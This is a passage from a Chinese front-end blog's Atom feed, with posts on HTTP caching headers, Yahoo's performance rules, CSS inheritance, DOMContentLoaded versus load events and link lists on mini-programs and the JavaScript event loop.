&lt;h2 id=&quot;1-IOS-移动端-click-事件-300ms-的延迟相应&quot;&gt;&lt;a href=&quot;#1-IOS-移动端-click-事件-300ms-的延迟相应&quot; class=&quot;headerlink&quot; title=&quot;1. IOS 移动端 click 事件 300ms 的延迟相应&quot;&gt;&lt;/a&gt;1. IOS 移动端 click 事件 300ms 的延迟相应&lt;/h2&gt;&lt;p&gt;移动设备上的 web 网页是有 300ms 延迟的，往往会造成按钮点击延迟甚至是点击失效。&lt;/p&gt;
&lt;p&gt;这是由于区分单机事件和双击屏幕缩放的历史原因造成的。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="HTML5" scheme="https://hexo.bangz.me/tags/HTML5/"/>
    
      <category term="CSS3" scheme="https://hexo.bangz.me/tags/CSS3/"/>
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>雅虎开发的 14 条军规</title>
    <link href="https://hexo.bangz.me/archives/law-of-yahoo-web-development.html"/>
    <id>https://hexo.bangz.me/archives/law-of-yahoo-web-development.html</id>
    <published>2018-07-30T08:44:17.000Z</published>
    <updated>2018-07-31T07:02:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>对于前端的性能优化，早期有雅虎的十四条军规作为思路导向，目的是为了从开发源头上减少后期性能优化的复杂度</p><a id="more"></a><ol><li>尽可能减少 HTTP 请求数</li><li>使用内容分发网络 CDN</li><li>添加 Expire/Cache-Control 头：Add an Expires Header</li><li>启动 Gzip 压缩</li><li>将 CSS 放在页面最上面</li><li>将 script 放在页面最下面</li><li>避免在 CSS 中使用 Expressions</li><li>把 javascript 和 CSS 都放到外部文件中</li><li>减少 DNS 查询</li><li>压缩 javascript 和 CSS</li><li>避免重定向</li><li>移除重复的脚本</li><li>配置实体标签（ETags）</li><li>使 AJAX 缓存</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://developer.51cto.com/art/201207/347525_all.htm" rel="external nofollow noopener noreferrer" target="_blank">Yahoo 前端优化十四条军规</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对于前端的性能优化，早期有雅虎的十四条军规作为思路导向，目的是为了从开发源头上减少后期性能优化的复杂度&lt;/p&gt;
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="HTTP" scheme="https://hexo.bangz.me/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>HTTP 缓存机制（强缓存与协商缓存）</title>
    <link href="https://hexo.bangz.me/archives/http-cache-tutorial.html"/>
    <id>https://hexo.bangz.me/archives/http-cache-tutorial.html</id>
    <published>2018-07-13T11:38:32.000Z</published>
    <updated>2018-07-13T12:25:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>浏览器缓存，也就是客户端缓存，是浏览器在本地磁盘对用户最近请求过的文档进行存储，当访问者再次访问同一页面时，浏览器就可以直接从本地磁盘加载文档。<br>浏览器缓存既是网页性能优化里面静态资源相关优化的一大利器，也是无数 web 开发人员在工作过程不可避免的一大问题，所以在产品开发的时候我们总是想办法避免缓存产生，而在产品发布之时又在想策略管理缓存提升网页的访问速度。因此，了解缓存与控制缓存就显得非常重要了。<br><a id="more"></a></p><hr><h1 id="1-浏览器缓存"><a href="#1-浏览器缓存" class="headerlink" title="1. 浏览器缓存"></a>1. 浏览器缓存</h1><p>浏览器缓存分为两种，分别为 <strong> 强缓存（也称本地缓存）</strong> 和 <strong> 协商缓存（也称弱缓存）</strong>。</p><p>对于强缓存和协商缓存，判定过程如下： </p><ol><li>浏览器加载资源时，先根据 <code>response</code> 的 <code>header</code> 中某些字段判断是否命中强缓存，若命中，浏览器直接从缓存中读取资源，不会发送请求到服务器。 </li><li>当强缓存没有命中的时候，浏览器一定会发送一个请求到服务器，此时服务器根据 resquest 的 header 中某些字段判断是否命中协商缓存，若命中，服务器返回请求，但不会返回这个资源的数据，而是告诉客户端可以直接从缓存中加载这个资源。</li></ol><p>对于强缓存和协商缓存，共同点在于，若命中，它们都是从客户端缓存中加载资源，而不是从服务器加载资源数据；而不同点在于，强缓存不发请求到服务器，协商缓存会发请求到服务器以咨询缓存是否过期。</p><p>普通刷新会启用协商缓存，忽略强缓存。只有在地址栏或收藏夹输入网址、通过链接引用资源等情况下，浏览器才会启用强缓存，这也是为什么有时候我们更新一张图片、一个 js 文件，页面内容依然是旧的，但是直接浏览器访问那个图片或文件，看到的内容却是新的。</p><hr><h1 id="2-浏览器发送请求过程"><a href="#2-浏览器发送请求过程" class="headerlink" title="2. 浏览器发送请求过程"></a>2. 浏览器发送请求过程</h1><p>当浏览器 <strong> 第一次发送请求 </strong> 时，本地无缓存，向 web 服务器发送请求，服务器起端响应请求，浏览器端缓存。<br><img src="/images/2018/07/http-cache-1.png" alt=""><br>在第一次请求时，服务器会将页面最后修改时间通过 Last-Modified 标识由服务器发送给客户端，客户端记录修改时间；服务器还会生成一个 Etag，并发送给客户端。  </p><p>当浏览器 <strong> 再次发送请求 </strong> 时：<br><img src="/images/2018/07/http-cache-2.png" alt=""><br>根据上图，浏览器在 <strong> 第一次请求发生后，再次发送请求 </strong> 时：  </p><ul><li>浏览器请求某一资源时，会先获取该资源缓存中 <code>response</code> 的 <code>header</code> 信息，然后根据 <code>header</code> 中的 <code>Cache-Control</code> 和 <code>Expires</code> 来判断是否过期。若没过期则直接从缓存中获取资源信息，包括缓存的 <code>header</code> 的信息，所以此次请求不会与服务器进行通信。这里判断是否过期，则是强缓存相关。</li><li>如果显示已过期，浏览器会向服务器端发送请求，这个请求会携带第一次请求返回的有关缓存的 <code>header</code> 字段信息，比如客户端会通过 If-None-Match 头将先前服务器端发送过来的 <code>Etag</code> 发送给服务器，服务会对比这个客户端发过来的 Etag 是否与服务器的相同，若相同，就将 <code>If-None-Match</code> 的值设为 <code>false</code> ，返回状态 304，客户端继续使用本地缓存，不解析服务器端发回来的数据，若不相同就将 <code>If-None-Match</code> 的值设为 <code>true</code> ，返回状态为 200，客户端重新机械服务器端返回的数据；客户端还会通过 <code>If-Modified-Since</code> 头将先前服务器端发过来的最后修改时间戳发送给服务器，服务器端通过这个时间戳判断客户端的页面是否是最新的，如果不是最新的，则返回最新的内容，如果是最新的，则返回 304 ，客户端继续使用本地缓存。</li></ul><hr><h1 id="3-强缓存"><a href="#3-强缓存" class="headerlink" title="3. 强缓存"></a>3. 强缓存</h1><p><strong> 简而言之，强缓存就是在客户端进行验证本地缓存是否可用。</strong><br>强缓存是利用 <code>http</code> 头中的 <code>Expires</code> 和 <code>Cache-Control</code> 两个字段来控制的，用来表示资源的缓存时间。<br>强缓存中，普通刷新会忽略它，但不会清除它；而强制刷新，请求会带上 <code>Cache-Control:no-cache</code> 和 <code>Pragma:no-cache</code>。</p><h2 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h2><p><code>Expires</code> 是 http1.0 的规范，它的值是一个绝对时间的 GMT 格式的时间字符串，该时间代表着这个资源的失效时间，只要发送请求时间是在 Expires 之前，那么本地缓存始终有效，则在缓存中读取数据。因此这种方式有一个明显的缺点，由于失效的时间是一个绝对时间，所以当服务器与客户端时间偏差较大时，就会导致缓存混乱。<br>如果同时出现 Cache-Control:max-age 和 Expires，那么 max-age 优先级更高。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cache-control:max-age=691200</span><br><span class="line">expires:Fri, 14 Apr 2017 10:47:02 GMT</span><br></pre></td></tr></table></figure><p>那么表示资源可以被缓存的最长时间为 691200 秒，会优先考虑 max-age。</p><h2 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h2><p><code>Cache-Control</code> 是在 http1.1 中出现的，是通用首部字段，既可用在 <code>request</code> 和 <code>response</code>。可以利用该字段的 max-age 值来进行判断，它是一个相对时间，例如 <code>Cache-Control:max-age=3600</code>，代表着资源的有效期是 3600 秒。对于 <code>response</code> 报文，<code>cache-control</code> 除了该字段外，还有下面几个比较常用的设置值：</p><ul><li>no-cache：不使用本地缓存。需要使用缓存协商，先与服务器确认返回的响应是否被更改，如果之前的响应中存在 ETag，那么请求的时候会与服务端验证，如果资源未被更改，则可以避免重新下载。</li><li>no-store：直接禁止浏览器缓存数据，每次用户请求该资源，都会向服务器发送一个请求，每次都会下载完整的资源。</li><li>public：可以被所有的用户缓存，包括终端用户和 CDN 等中间代理服务器。</li><li>private：只能被终端用户的浏览器缓存，不允许 CDN 等中继缓存服务器对其缓存。</li></ul><hr><h1 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h1><p><strong> 简而言之，协商缓存就是想服务器发送请求以咨询本地缓存是否可用。</strong><br>协商缓存主要涉及两组 <code>header</code> 字段： <code>Etag</code> 和 <code>If-None-Match</code>、<code>Last-Modified</code> 和 <code>If-Modified-Since</code>。</p><h2 id="Etag-和-If-None-Match"><a href="#Etag-和-If-None-Match" class="headerlink" title="Etag 和 If-None-Match"></a>Etag 和 If-None-Match</h2><p><code>If-None-Match</code> 是 <code>requset</code> 报文的 <code>header</code> 中的一个字段，形如 <code>if-xxx</code> 这种样式的请求首部字段，都可称为条件请求。<br><code>Etag</code> 是 <code>response</code> 报文中 <code>header</code> 中的一个字段它是一种可将资源以字符串形式做唯一标识的方式，服务器会为每一份资源分配对应的 ETag 值。</p><p>其执行的过程如下： </p><ol><li>当第一次发起 HTTP 请求时，服务器会为相应的资源返回一个 ETag 值。 </li><li>当再次发起同一个请求时，客户端会在 <code>request</code> 的 <code>header</code> 中带上 <code>If-None-Match</code> ，而它的值就是 Etag 的值。 </li><li>然后服务器会比对这个客服端发送过来的 Etag 是否与服务器的相同：若相同，就将 <code>If-None-Match</code> 的值设为 <code>false</code> ，返回状态为 <code>304</code> ，并且服务器不返回该资源的数据，客户端继续使用本地缓存，不解析服务器返回的数据；若不相同，就将 <code>If-None-Match</code> 的值设为 <code>true</code> ，返回状态为 200 ，同时服务器返回该资源的新数据，客户端重新解析服务器返回的数据。</li></ol><h2 id="Last-Modify-和-If-Modify-Since"><a href="#Last-Modify-和-If-Modify-Since" class="headerlink" title="Last-Modify 和 If-Modify-Since"></a>Last-Modify 和 If-Modify-Since</h2><p><code>Last-Modify</code> 是 <code>response</code> 报文的 <code>header</code> 中的一个字段，其值为时间，用于标识该资源的最后修改时间。<br><code>If-Modify-Since</code> 是 <code>request</code> 报文的 <code>header</code> 中的一个字段，其值也为时间。</p><p>其执行过程如下： </p><ol><li><p>当第一次发起 HTTP 请求时，服务器 <code>response</code> 的 <code>header</code> 中包含 <code>Last-Modify</code> ，标明该资源的最后修改时间，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Last-Modify: Thu,31 Dec 2037 23:59:59 GMT</span><br></pre></td></tr></table></figure></li><li><p>当再次发起 HTTP 请求时，客户端 <code>requset</code> 的 <code>header</code> 中包含 <code>If-Modify-Since</code> 字段，该值为缓存之前服务器返回的 <code>Last-Modify</code> 的值，服务器收到 If-Modify-Since 后，根据资源的最后修改时间判断是否命中缓存。</p></li><li>如果命中缓存，则返回 304 ，并且不会返回资源内容，并且不会返回 Last-Modify 。  </li></ol><h2 id="两者比较"><a href="#两者比较" class="headerlink" title="两者比较"></a>两者比较</h2><p><code>Last-Modified</code> 与 <code>Etag</code> 类似。不过 <code>Last-Modified</code> 表示响应资源在服务器最后修改时间而已。与 <code>Etag</code> 相比，不足为：</p><ul><li>Last-Modified 标注的最后修改只能精确到秒级，如果某些文件在 1 秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间；</li><li>如果某些文件会被定期生成，当有时内容并没有任何变化，但 Last-Modified 却改变了，导致文件没法使用缓存；</li><li>有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。  </li></ul><p>而且，Etag 是服务器自动生成或者由开发者生成的对应资源在服务器端的唯一标识符，能够更加准确的控制缓存。  </p><p>另外，Last-Modified 与 ETag 是可以一起使用的，<strong> 服务器会优先验证 ETag，一致的情况下，才会继续比对 Last-Modified，最后才决定是否返回 304。</strong></p><p><strong> 参考资料 </strong>  </p><p><a href="https://blog.csdn.net/qaserfvvbbert/article/details/80093336" rel="external nofollow noopener noreferrer" target="_blank">浏览器文件缓存优化策略</a><br><a href="https://segmentfault.com/a/1190000008956069" rel="external nofollow noopener noreferrer" target="_blank">HTTP 强缓存和协商缓存</a><br><a href="https://www.cnblogs.com/wonyun/p/5524617.html" rel="external nofollow noopener noreferrer" target="_blank">http 协商缓存 VS 强缓存</a><br><a href="http://obkoro1.com/2018/06/09/%E6%B5%85%E6%9E%90HTTP%E7%BC%93%E5%AD%98%E7%9A%84%E6%9C%BA%E5%88%B6-%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98/" rel="external nofollow noopener noreferrer" target="_blank">浅析 HTTP 缓存的机制 - 浏览器缓存</a><br><a href="https://www.zybuluo.com/xudongh/note/907856" rel="external nofollow noopener noreferrer" target="_blank">HTTP 缓存机制</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;浏览器缓存，也就是客户端缓存，是浏览器在本地磁盘对用户最近请求过的文档进行存储，当访问者再次访问同一页面时，浏览器就可以直接从本地磁盘加载文档。&lt;br&gt;浏览器缓存既是网页性能优化里面静态资源相关优化的一大利器，也是无数 web 开发人员在工作过程不可避免的一大问题，所以在产品开发的时候我们总是想办法避免缓存产生，而在产品发布之时又在想策略管理缓存提升网页的访问速度。因此，了解缓存与控制缓存就显得非常重要了。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="HTTP" scheme="https://hexo.bangz.me/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>CSS 中的继承属性与非继承属性</title>
    <link href="https://hexo.bangz.me/archives/css-inherited-properties-and-non-inherited-properties.html"/>
    <id>https://hexo.bangz.me/archives/css-inherited-properties-and-non-inherited-properties.html</id>
    <published>2018-07-13T10:16:03.000Z</published>
    <updated>2018-07-13T12:26:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>当我们参考 CSS 规范时，就会发现每个属性中都指出了 Inherited 的值，即是否可继承。这决定了当你还没有为元素的属性指定值时该如何计算值。今天我们就大概的说说 CSS 中的继承属性与非继承属性。</p><h1 id="1-继承属性-inherited-property"><a href="#1-继承属性-inherited-property" class="headerlink" title="1. 继承属性 (inherited property)"></a>1. 继承属性 (inherited property)</h1><p>当元素的一个继承属性没有指定值时，则取父元素的同属性的计算值。只有文档根元素取该属性的概述中给定的初始值。下面我们举一个简单的例子:<br><a id="more"></a></p><p><strong> 典型例子: <code>color</code> 属性 </strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123; <span class="attribute">color</span>: orange; &#125;</span><br></pre></td></tr></table></figure><p>HTML:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span> I am a <span class="tag">&lt;<span class="name">em</span>&gt;</span>smile<span class="tag">&lt;/<span class="name">em</span>&gt;</span> girl. <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>这里你就会发现 “smile” 文本将呈现橙色，原因是 <code>em</code> 元素继承了 <code>p</code> 元素的 <code>color</code> 属性的值。</p><p><strong> 常见的继承属性 </strong><br>那么，有哪些我们常见的继承属性呢？这里我给大家例举一下:</p><ul><li>border-collapse</li><li>border-spacing</li><li>caption-side</li><li>color</li><li>cursor</li><li>direction</li><li>font (其中包括 <code>font-family</code> , <code>font-size</code> , <code>font-weight</code> , <code>font-style</code>)</li><li>letter-spacing</li><li>line-height</li><li>list-style (其中包括 <code>list-style-image</code> , <code>list-style-position</code> , <code>list-style-type</code>)</li><li>text-align</li><li>text-indent</li><li>text-transform</li><li>visibility</li><li>white-space</li><li>word-spacing</li></ul><p>大家有没有发现一些字体呀，文本呀，颜色等的设置都是可继承属性 ~</p><p><a href="https://www.w3.org/TR/CSS21/propidx.html" rel="external nofollow noopener noreferrer" target="_blank">参考地址</a></p><h1 id="2-非继承属性-reset-property"><a href="#2-非继承属性-reset-property" class="headerlink" title="2. 非继承属性 (reset property)"></a>2. 非继承属性 (reset property)</h1><p>当元素的一个非继承属性没有指定值时，则取属性的初始值。</p><p>典型例子: border 属性<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123; <span class="attribute">border</span>: medium solid &#125;</span><br></pre></td></tr></table></figure></p><p>HTML:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span> I am a <span class="tag">&lt;<span class="name">em</span>&gt;</span>smile<span class="tag">&lt;/<span class="name">em</span>&gt;</span> girl. <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>这时你就会发现文本 “smile” 没有边框，原因是 <code>border</code> 属性为不可继承属性，其初始值为 <code>none</code>。</p><p><strong> 常见的非继承属性 </strong><br>这里例举几个常见的非继承属性:</p><ul><li>z-index</li><li>width (其中包括 min-width , max-width)</li><li>dispaly</li><li>float</li><li>clear</li><li>vertical-align</li><li>unicode-bidi</li><li>position</li><li>top</li><li>bottom</li><li>left</li><li>right</li><li>text-decoration</li><li>background (其中包括 <code>background-color</code> , <code>background-image</code> , <code>background-position</code> , <code>background-attachment</code> , <code>background-repeat</code>)</li><li>border (其中包括 <code>border-color</code> , <code>border-style</code> , <code>border-width</code> , <code>border-spacing</code> and so on)</li><li>padding (其中包括 <code>padding-left</code> , <code>padding-right</code> , <code>padding-top</code> , <code>padding-bottom</code>)</li><li>margin (其中包括 <code>margin-left</code> , <code>margin-right</code> , <code>margin-top</code> , <code>margin-bottom</code>)</li><li>outline (其中包括 <code>outline-color</code> , <code>outline-style</code> , <code>outline-width</code>)</li><li>clip</li><li>content</li></ul><p>非继承属性大部分都是一些和定位呀，浮动呀，盒子模型呀等有关 ~</p><p><a href="https://www.w3.org/TR/CSS21/propidx.html" rel="external nofollow noopener noreferrer" target="_blank">参考地址</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当我们参考 CSS 规范时，就会发现每个属性中都指出了 Inherited 的值，即是否可继承。这决定了当你还没有为元素的属性指定值时该如何计算值。今天我们就大概的说说 CSS 中的继承属性与非继承属性。&lt;/p&gt;
&lt;h1 id=&quot;1-继承属性-inherited-property&quot;&gt;&lt;a href=&quot;#1-继承属性-inherited-property&quot; class=&quot;headerlink&quot; title=&quot;1. 继承属性 (inherited property)&quot;&gt;&lt;/a&gt;1. 继承属性 (inherited property)&lt;/h1&gt;&lt;p&gt;当元素的一个继承属性没有指定值时，则取父元素的同属性的计算值。只有文档根元素取该属性的概述中给定的初始值。下面我们举一个简单的例子:&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="HTML5" scheme="https://hexo.bangz.me/tags/HTML5/"/>
    
      <category term="CSS3" scheme="https://hexo.bangz.me/tags/CSS3/"/>
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>小程序实现原理链接集合</title>
    <link href="https://hexo.bangz.me/archives/principle-of-wechat-miniprogram.html"/>
    <id>https://hexo.bangz.me/archives/principle-of-wechat-miniprogram.html</id>
    <published>2018-07-13T07:18:04.000Z</published>
    <updated>2018-07-13T11:41:23.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/1029663" rel="external nofollow noopener noreferrer" target="_blank">小程序实现原理解析</a><br><a href="https://zhuanlan.zhihu.com/p/22607204" rel="external nofollow noopener noreferrer" target="_blank">「微信小程序」剖析（二）：框架原理 | 在浏览器上运行的猜想</a><br><a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/details.html" rel="external nofollow noopener noreferrer" target="_blank">运行环境差异</a><br><a href="https://csspod.com/the-mobile-web-browsers/" rel="external nofollow noopener noreferrer" target="_blank">移动 Web 开发之浏览器</a><br><a href="https://www.zhihu.com/question/20930880" rel="external nofollow noopener noreferrer" target="_blank">Blink 引擎相对于 WebKit 好在哪里？</a><br><a href="https://www.jianshu.com/p/4e8ed26d3b7a" rel="external nofollow noopener noreferrer" target="_blank">《微信小程序架构解析》丨 NOTES</a><br><a href="https://guofeng007.github.io/2017/10/16/wechat-mini-app/#%E5%BE%AE%E4%BF%A1%E5%AE%89%E5%8D%93%E7%AB%AF%E5%B0%8F%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%83%E5%B1%B1%E4%B9%8B%E7%9F%B3%E5%8F%AF%E4%BB%A5%E6%94%BB%E7%8E%89" rel="external nofollow noopener noreferrer" target="_blank">微信安卓端小程序逆向分析–它山之石可以攻玉</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://cloud.tencent.com/developer/article/1029663&quot; rel=&quot;external nofollow noopener noreferrer&quot; target=&quot;_blank&quot;&gt;小程序实现原理解析&lt;/a&gt;&lt;b
      
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="HTML5" scheme="https://hexo.bangz.me/tags/HTML5/"/>
    
      <category term="javascript" scheme="https://hexo.bangz.me/tags/javascript/"/>
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="ECMAScript" scheme="https://hexo.bangz.me/tags/ECMAScript/"/>
    
      <category term="小程序" scheme="https://hexo.bangz.me/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>事件 DOMContentLoaded 和 load 的区别</title>
    <link href="https://hexo.bangz.me/archives/difference-between-domcontentloaded-and-load.html"/>
    <id>https://hexo.bangz.me/archives/difference-between-domcontentloaded-and-load.html</id>
    <published>2018-07-10T09:17:54.000Z</published>
    <updated>2018-07-12T08:08:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>他们的区别是，触发的时机不一样，先触发 DOMContentLoaded 事件，后触发 load 事件。</p><p>DOM 文档加载的步骤为</p><ol><li>解析 HTML 结构。</li><li>加载外部脚本和样式表文件。</li><li>解析并执行脚本代码。</li><li>DOM 树构建完成。//DOMContentLoaded   //jQuery.ready</li><li>加载图片等外部文件。</li><li>页面加载完毕。//load</li></ol><p>在第 4 步，会触发 DOMContentLoaded 事件。在第 6 步，触发 load 事件。</p><a id="more"></a><p>用原生 js 可以这么写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 不兼容老的浏览器，兼容写法见 [jQuery 中 ready 与 load 事件](http://www.imooc.com/code/3253)，或用 jQuery</span></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">"DOMContentLoaded"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="comment">// ... 代码...</span></span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">"load"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ... 代码...</span></span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>用 jQuery 这么写<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DOMContentLoaded</span></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ... 代码...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//load  </span></span><br><span class="line">$(<span class="built_in">document</span>).load(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ... 代码...</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 貌似 1.8 版本之后, load 就抛弃了. 只能用 window.onload() 或者 addEventListener 这两个事件监听页面加载完成 </span></span><br></pre></td></tr></table></figure><p>参考资料：</p><ul><li><a href="http://www.lrxin.com/archives-1146.html" rel="external nofollow noopener noreferrer" target="_blank">事件 DOMContentLoaded 和 load 的区别</a></li><li><a href="http://www.alloyteam.com/2014/03/effect-js-css-and-img-event-of-domcontentloaded/" rel="external nofollow noopener noreferrer" target="_blank">JS、CSS 以及 img 对 DOMContentLoaded 事件的影响</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/Events/DOMContentLoaded" rel="external nofollow noopener noreferrer" target="_blank">DOMContentLoaded - 事件类型一览表 | MDN</a></li><li><a href="https://www.cnblogs.com/caizhenbo/p/6679478.html" rel="external nofollow noopener noreferrer" target="_blank">DOMContentLoaded 与 load 的区别</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;他们的区别是，触发的时机不一样，先触发 DOMContentLoaded 事件，后触发 load 事件。&lt;/p&gt;
&lt;p&gt;DOM 文档加载的步骤为&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;解析 HTML 结构。&lt;/li&gt;
&lt;li&gt;加载外部脚本和样式表文件。&lt;/li&gt;
&lt;li&gt;解析并执行脚本代码。&lt;/li&gt;
&lt;li&gt;DOM 树构建完成。//DOMContentLoaded   //jQuery.ready&lt;/li&gt;
&lt;li&gt;加载图片等外部文件。&lt;/li&gt;
&lt;li&gt;页面加载完毕。//load&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在第 4 步，会触发 DOMContentLoaded 事件。在第 6 步，触发 load 事件。&lt;/p&gt;
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="javascript" scheme="https://hexo.bangz.me/tags/javascript/"/>
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="ECMAScript" scheme="https://hexo.bangz.me/tags/ECMAScript/"/>
    
  </entry>
  
  <entry>
    <title>JS 事件循环资料集合</title>
    <link href="https://hexo.bangz.me/archives/event-loop-tutorial-links.html"/>
    <id>https://hexo.bangz.me/archives/event-loop-tutorial-links.html</id>
    <published>2018-07-10T08:08:36.000Z</published>
    <updated>2018-07-13T07:07:47.000Z</updated>
    
    <content type="html"><![CDATA[<ul><li><a href="https://juejin.im/entry/596d78ee6fb9a06bb752475c" rel="external nofollow noopener noreferrer" target="_blank">深入探究 eventloop 与浏览器渲染的时序问题</a></li><li><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" rel="external nofollow noopener noreferrer" target="_blank">JavaScript 运行机制详解：再谈 Event Loop</a></li><li><a href="https://zhuanlan.zhihu.com/p/33087629" rel="external nofollow noopener noreferrer" target="_blank">Event Loop 的规范和实现</a></li><li><a href="http://lynnelv.github.io/js-event-loop-nodejs" rel="external nofollow noopener noreferrer" target="_blank">深入理解 js 事件循环机制（Node.js 篇）</a></li><li><a href="http://lynnelv.github.io/js-event-loop-browser" rel="external nofollow noopener noreferrer" target="_blank">深入理解 js 事件循环机制（浏览器篇）</a></li><li><a href="https://github.com/ccforward/cc/issues/47" rel="external nofollow noopener noreferrer" target="_blank">理解事件循环一 (浅析)</a></li><li><a href="https://github.com/ccforward/cc/issues/48" rel="external nofollow noopener noreferrer" target="_blank">理解事件循环二 (macrotask 和 microtask)</a></li><li><a href="https://blog.kaolafed.com/2017/04/21/JavaScript%E5%B9%B6%E5%8F%91%E6%A8%A1%E5%9E%8B%E4%B8%8EEvent%20Loop/" rel="external nofollow noopener noreferrer" target="_blank">JavaScript 并发模型与 Event Loop</a></li><li><a href="https://juejin.im/entry/5a7864d4f265da4e914b3dc7" rel="external nofollow noopener noreferrer" target="_blank">Event Loop 中的 microtask 与 macrotask</a></li><li><a href="https://zhuanlan.zhihu.com/p/24460769" rel="external nofollow noopener noreferrer" target="_blank">HTML 系列：macrotask 和 microtask</a></li><li><a href="https://hijiangtao.github.io/2018/01/08/JavaScript-and-Browser-Engines-with-Threads/" rel="external 